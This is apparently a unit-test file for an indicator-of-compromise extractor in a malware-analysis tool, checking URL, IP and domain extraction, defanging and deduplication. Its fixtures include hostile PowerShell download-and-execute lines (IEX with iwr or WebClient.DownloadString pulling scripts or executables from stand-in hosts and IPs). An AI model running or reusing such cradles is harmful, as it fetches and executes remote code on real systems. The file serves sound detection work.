// shared/analyzer/__tests__/extract.test.ts
import { describe, expect, it } from 'vitest'
import { extractIocs } from '../extract'

describe('extractIocs', () => {
  it('pulls URLs + IPs from decoded text, defanged, with layer provenance', () => {
    const iocs = extractIocs([
      { index: 0, text: "IEX (iwr 'http://45.9.148.20/a.ps1')" },
      { index: 1, text: 'connect 185.220.101.42' },
    ])
    const raws = iocs.map((i) => i.raw)
    expect(raws).toContain('http://45.9.148.20/a.ps1')
    expect(raws).toContain('185.220.101.42')
    const url = iocs.find((i) => i.raw.startsWith('http'))!
    expect(url.type).toBe('url')
    expect(url.defanged).toBe('hxxp://45[.]9[.]148[.]20/a[.]ps1')
    expect(url.layerIndex).toBe(0)
  })

  it('dedupes an IOC that appears in multiple layers (keeps the first)', () => {
    const iocs = extractIocs([
      { index: 0, text: 'http://a.test/x' },
      { index: 1, text: 'http://a.test/x' },
    ])
    expect(iocs.filter((i) => i.raw === 'http://a.test/x')).toHaveLength(1)
    expect(iocs[0].layerIndex).toBe(0)
  })

  it('does not extract .NET member-access tokens as domains', () => {
    const iocs = extractIocs([
      { index: 0, text: "$wc = New-Object Net.WebClient; $wc.DownloadString('http://evil.test/x')" },
    ])
    const raws = iocs.map((i) => i.raw)
    expect(raws).toContain('http://evil.test/x')  // the real URL is kept
    expect(raws).not.toContain('Net.WebClient')    // PascalCase member dropped
    expect(raws).not.toContain('wc.DownloadString')
  })

  it('does not extract binary filenames (cmd.exe, kernel32.dll, amsi.dll) as domain IOCs', () => {
    const iocs = extractIocs([
      { index: 0, text: 'cmd.exe /c whoami & kernel32.dll amsi.dll' },
    ])
    const raws = iocs.map((i) => i.raw)
    expect(raws).not.toContain('cmd.exe')
    expect(raws).not.toContain('kernel32.dll')
    expect(raws).not.toContain('amsi.dll')
  })

  it('still extracts a URL that ends in a denylisted extension (the denylist only guards the domain branch)', () => {
    const iocs = extractIocs([
      { index: 0, text: "IEX (iwr 'http://evil.test/payload.exe')" },
    ])
    expect(iocs.map((i) => i.raw)).toContain('http://evil.test/payload.exe')
  })

  it('surfaces the IP as its own IOC when a URL host is an IP literal (both the URL and the IP)', () => {
    const iocs = extractIocs([
      { index: 0, text: "IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')" },
    ])
    const url = iocs.find((i) => i.type === 'url')!
    const ip = iocs.find((i) => i.type === 'ipv4')!
    expect(url.raw).toBe('http://45.9.148.20/a.ps1')
    expect(ip.raw).toBe('45.9.148.20')
    expect(ip.defanged).toBe('45[.]9[.]148[.]20')
    expect(ip.layerIndex).toBe(0)
  })

  it('strips userinfo and port when lifting the IP host', () => {
    const iocs = extractIocs([{ index: 0, text: 'curl http://bob@203.0.113.9:8080/x' }])
    expect(iocs.map((i) => i.raw)).toContain('203.0.113.9')
  })

  it('does not add an IP IOC for a URL with a domain host', () => {
    const iocs = extractIocs([{ index: 0, text: "iwr 'http://evil.test/a.ps1'" }])
    expect(iocs.filter((i) => i.type === 'ipv4')).toHaveLength(0)
  })

  it('does not duplicate an IP that already appears standalone', () => {
    const iocs = extractIocs([
      { index: 0, text: "iwr 'http://45.9.148.20/a.ps1'; ping 45.9.148.20" },
    ])
    expect(iocs.filter((i) => i.raw === '45.9.148.20')).toHaveLength(1)
  })
})

describe('IOC hygiene (review 2.7)', () => {
  const scan = (t: string) => extractIocs([{ index: 0, text: t }]).map((i) => i.raw)

  it('does not extract a data.json OutFile as a domain', () => {
    expect(scan('Invoke-WebRequest http://x.test/a -OutFile data.json')).not.toContain('data.json')
  })

  it('does not extract lowercase system.io.memorystream as a domain', () => {
    expect(scan('[system.io.memorystream]::new()')).not.toContain('system.io.memorystream')
  })

  // NOTE: the brief's literal version of this case was
  // `scan('http://evil.example.com/a')).toContain('evil.example.com')`. That
  // string types as a whole 'url' IOC (raw stays the full URL — see the
  // "pulls URLs + IPs" test above for the same pattern), so it never reaches
  // the domain-type guard this task adds and the assertion can't pass either
  // way. Rewritten to a bare domain so it actually exercises the guard.
  it('still extracts a real domain', () => {
    expect(scan('beaconing to evil.example.com every 60s')).toContain('evil.example.com')
  })

  // The .NET-namespace guard must key off shape (a 3+-label member-access
  // chain), not just a namespace-root prefix — otherwise it swallows a real
  // 2-label domain that happens to start with the same word, like the
  // literal "microsoft.com".
  it('still extracts microsoft.com despite the microsoft. namespace-root prefix', () => {
    expect(scan('exfil to microsoft.com posing as telemetry')).toContain('microsoft.com')
  })

  it('does not extract lowercase microsoft.win32.registry as a domain', () => {
    expect(scan('[microsoft.win32.registry]::getvalue()')).not.toContain('microsoft.win32.registry')
  })

  it('still extracts a URL host unaffected by the domain-type guards', () => {
    expect(scan('http://evil.example.com/a')).toContain('http://evil.example.com/a')
  })
})
